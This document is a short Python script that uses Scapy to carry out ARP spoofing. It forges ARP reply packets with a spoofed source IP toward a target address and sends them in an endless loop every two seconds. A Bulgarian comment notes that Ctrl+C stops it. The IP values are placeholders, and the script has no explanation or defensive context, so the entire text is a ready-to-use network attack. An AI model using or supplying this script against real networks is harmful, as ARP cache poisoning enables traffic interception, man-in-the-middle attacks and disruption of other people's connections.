from scapy.all import *
from scapy.layers.l2 import ARP

ip_target = 'IP Address'
ip_spoofing = 'My IP'

packet = ARP(op=2, pdst=ip_target, hwdst='ff:ff:ff:ff:ff:ff', psrc=ip_spoofing)

send(packet, loop=1, inter=2)  # Изпраща непрекъснато (Ctrl+C за спиране)
